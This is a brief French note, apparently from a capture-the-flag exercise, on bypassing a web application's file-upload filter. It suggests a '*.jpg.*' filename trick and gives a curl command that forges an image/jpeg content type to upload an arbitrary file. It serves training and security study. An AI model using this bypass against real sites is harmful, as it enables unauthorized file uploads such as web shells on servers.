/index.php?page=upload

uploader un fichier dont le type est jpeg le nom contient *.jpg.*

OU

faker le type du fichier pour etre considere comme etant de type image
curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@jesuismechant;type=image/jpeg' "http://<IP>/?page=upload#"

Get the flag
